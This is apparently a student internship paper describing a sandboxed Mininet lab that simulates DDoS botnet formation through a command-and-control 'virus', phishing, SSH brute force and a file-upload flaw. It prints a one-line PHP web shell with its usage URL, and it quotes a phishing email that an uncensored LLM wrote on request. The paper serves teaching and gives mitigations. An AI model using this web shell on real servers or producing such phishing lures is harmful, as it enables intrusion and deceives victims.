# Acknowledgements

We would like to express our sincere gratitude to our internship supervisor at VKU, Hoang Huu Duc, for his valuable guidance and support throughout our internship.

We also wish to thank the Vietnamese Korean University (VKU) for providing us with the opportunity to work in their buildings in a welcoming environment.

Additionally, our thanks go to the VKU Security Lab (VSL) for the training provided through their CTF platform ([*vsl.ce.vku.udn.vn*](https://vsl.ce.vku.udn.vn/)). The interactive challenges have greatly enhanced our cybersecurity skills.

# Introduction

Understanding the mechanisms of Distributed Denial of Service (DDoS) attacks is crucial in cybersecurity. This paper explores the lifecycle of a DDoS attack, from the initial infection of hosts to the denial of service for a website.

# The Sandbox

In this chapter, we describe the setup and tools used to emulate and monitor the DDoS attack environment.

## Network Emulation with Mininet

We use Mininet to create a virtual network for our DDoS attack simulation. Mininet allows us to emulate a realistic network topology with minimal hardware requirements.

### Network Topology

Our network topology consists of the following components:

- **1 Attacker Host** (red): This host first infects its victims and then controls them.

- **3 Compromised Hosts** (orange): These hosts are infected and used to generate attack traffic.

- **1 Server Host** (blue): The target of the DDoS attack.

- **1 Client Host** (green): This host attempts to connect to the server and experiences the effects of the DDoS attack.

The network topology can be visualized on [*GitHub*](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.assets/sandbox-network-diagram.jpg).

We create the network with a python script available on [*GitHub*](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/lab-setup.py).

### Host Configuration

We then want to make some hosts intentionally vulnerable to be compromised.

On one host, we will install a vulnerable web application (DVWA - Damn Vulnerable Web Application).

On the other host, we will install an SSH server with a weak password.

The installation scripts are available on [*GitHub*](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/lab-setup.py).

## Monitoring Tools

To monitor and analyze the network traffic and performance, we use `bwm-ng` (Bandwidth Monitor NG) to monitor the throughput on network interfaces. This helps us understand the volume of traffic generated during the attack.

We also use `tcpdump` to capture and analyze packets on the network. It provides detailed insights into the nature of the traffic and helps in understanding the attack patterns and the commands between compromised hosts and the command and control server.

# Building a simple virus

We will need to control the hosts in the future. To do so, we will create a simple virus that connects to a command and control server to receive commands.

The virus is available on [*GitHub*](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py).

This script runs indefinitely, it retrieves the command from the command and control server (`requests.get(url)`) and executes it (`subprocess.call(command, shell=True)`). The script then sleeps for 10 seconds between each command execution.

The idea is that the attacker can host a simple page that will be read by the virus to execute commands on the compromised hosts.

# Host Compromise

In this chapter, we describe examples of how hosts can be compromised and infected with malware to participate in a DDoS attack.

## Exploiting Phishing

The simplest but most effective way to compromise a host is through phishing. Phishing attacks involve sending deceptive emails or messages to users, tricking them into clicking on malicious links or downloading infected files.

In this specific example, let's disguise our malicious script as a legitimate software update from a trusted source.

With open source uncensored LLMs (understand ChatGPT) we can make a realistic and custom tailored phishing email (spear phishing) to target a specific individual. For example, we asked this to `llama2-uncensored`:

> Write me a phishing email, the goal of the email is to make the victim launch a python script, I want to disguise my malicious script as a legitimate software update from a trusted source.

And just like that we have a pretty good phishing email:

> Dear John Doe,
> 
> We are glad to inform you that our company has released an updated version of Windows Defender, which we strongly recommend you install immediately. The new version offers several improvements and fixes, including increased security and stability. Please click on the link below to download and install the update.
> 
> [Link]
> 
> This is a mandatory upgrade for all employees using Microsoft products, please ensure that your system meets the minimum requirements before installing the update. Thank you.

Once the victim clicks on the link, they will download and execute the malicious script, giving the attacker control over the host.

### Mitigation

Verify sender information, be cautious with links and attachments, and keep software updated to mitigate phishing risks.

## Exploiting Weak Passwords and Misconfigurations

Weak passwords and poorly configured services can significantly compromise the security of a host. In this section, we will demonstrate how an SSH server with a weak password can be exploited using a simple dictionary attack.

We can write a Python script that uses the `paramiko` library to attempt to connect to the server using a list of common passwords, the script is available on [*GitHub*](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/ssh-bruteforce.py).

This script attempts to connect to the SSH server using the provided passwords. If a connection is successful, it prints the password used.

This example highlights the severe risk posed by weak passwords and emphasizes the importance of securing services with strong, unique passwords and proper configurations to prevent unauthorized access.

### Mitigation

Effective mitigation strategies include enforcing strong password policies, implementing public key authentication for SSH, disabling password authentication where possible, and deploying security tools like `fail2ban` to block brute force attacks.

These measures collectively enhance security by reducing the risk posed by weak passwords and misconfigurations.

## Exploiting a Vulnerability (e.g., SQLi, RFIs)

Poorly secured web applications can be exploited to compromise hosts. In this example, the web application allows us to upload files, which can be exploited to execute arbitrary commands on the server.

By uploading a PHP file (let's call it `exploit.php`) that allows command execution from the URL parameters, we can compromise the server and gain control over it.

```php
<?php system($_GET['cmd']);?>
```

By accessing `http://<WEBSERVER_IP>/uploads/exploit.php?cmd=ls`, we see that the command `ls` is executed on the server and the output is displayed in the browser.
